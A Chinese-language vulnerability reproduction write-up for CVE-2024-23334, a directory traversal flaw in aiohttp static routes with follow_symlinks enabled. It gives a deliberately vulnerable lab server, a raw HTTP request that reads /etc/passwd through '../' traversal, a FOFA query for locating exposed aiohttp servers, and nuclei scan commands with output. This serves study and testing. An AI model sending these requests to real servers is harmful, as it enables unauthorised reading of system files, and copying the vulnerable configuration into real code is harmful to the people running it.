# aiohttp 介绍

aiohttp 是一个基于 asyncio 实现的 Python HTTP 客户端和服务器框架。它提供了异步的 HTTP 客户端和服务器功能，能够处理高并发的网络请求。

# 影响版本

1.0.5<=aiohttp<3.9.2

# CVE-2024-23334 漏洞简介

使用 aiohttp 作为 Web 服务器并配置静态路由时，需要指定静态文件的根路径。此外，选项“follow_symlinks”可用于确定是否遵循静态根目录之外的符号链接。当“follow_symlinks”设置为 True 时，不会进行验证来检查给定的文件路径是否在根目录中。这可能导致目录遍历漏洞，导致未经授权访问系统上的任意文件，即使符号链接不存在也是如此。即，应用程序仅因安装代码而易受攻击，例如：

app.router.add_routes([
web.static("/static", "static/", follow_symlinks=True), # Remove follow_symlinks to avoid the vulnerability
])

# 漏洞复现

安装 aiohttp 库

```py
pip install aiohttp==3.9.1
```

```py
from aiohttp import web
async def index(request):
    return web.Response(text="Hello, World!")

app = web.Application()
app.router.add_routes([
    web.static("/static", "static/", follow_symlinks=True),
])
app.router.add_get('/', index)

if __name__ == '__main__':
    web.run_app(app, host='127.0.0.1', port=8080)
```

发送的数据包如下：

```
GET /static/../../../../etc/passwd HTTP/1.1
Host: 192.168.136.130:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

为了保持通用性，可以删掉大部分字段

```
GET /static/../../../../etc/passwd HTTP/1.1
Host: 192.168.136.130:8080
```

# POC

## 用 fofa 去查找

```sh
body="/static" && header="aiohttp"
```

经过测试得知，网上没有在野利用

## 本地搭建环境

```sh
nuclei -u 192.168.136.130:8080 -t C:\Users\20942\nuclei-templates\http\cves\2024\CVE-2024-23334.yaml
```

经过测试官方通用性不行

```sh
nuclei -u 192.168.136.130:8080 -t ./CVE-2024-23334.yaml
```

```output
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[ts-CVE-2024-23334] [http] [high] http://192.168.136.130:8080/static/../../../../../../etc/passwd
```
